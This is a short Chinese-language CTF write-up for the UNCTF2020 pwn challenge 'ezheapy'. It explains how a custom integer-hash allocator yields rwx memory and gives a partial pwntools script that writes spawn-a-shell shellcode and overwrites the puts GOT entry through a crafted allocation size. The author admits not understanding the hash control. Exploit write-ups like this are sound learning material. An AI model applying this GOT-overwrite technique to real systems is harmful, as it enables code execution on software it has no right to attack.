
## ezheapy
- 题目描述
- 题目附件：[ezheapy](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/unctf2020/pwn/ezheapy/ezheapy)
- 考察点：整数哈希
- 难度：不会

### 程序分析

比赛时看见是heap就没做，赛后看了看。

作者自己写的`hcalloc`，用的是整数哈希，可分配一片权限是`rwx`的内存，并且可编辑其内容。

### 解题思路

先随便分配一块内存，写入shellcode。再分配一块内存，控制哈希值正好是got表地址，由此可编辑got表为shellcode地址。（咋控制的哈希值没看懂，求密码师傅们解答。）

``` python
def add(sz):
    sla('5. Exit', '1')
    sla('How big is your paste (bytes)?', str(sz))

def edit(idx,data):
    sla('5. Exit', '2')
    sla('What paste would you like to write to?', str(idx))
    sla('Enter your input', data)

add(1024)
edit(0,asm(shellcraft.sh()))

add(0xE64164E0) # hash(0xE64164E0) == got['puts']
edit(1,p64(0xdde6c400)) # hash(1024) == 0xdde6c400
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/unctf2020/pwn/ezheapy) 

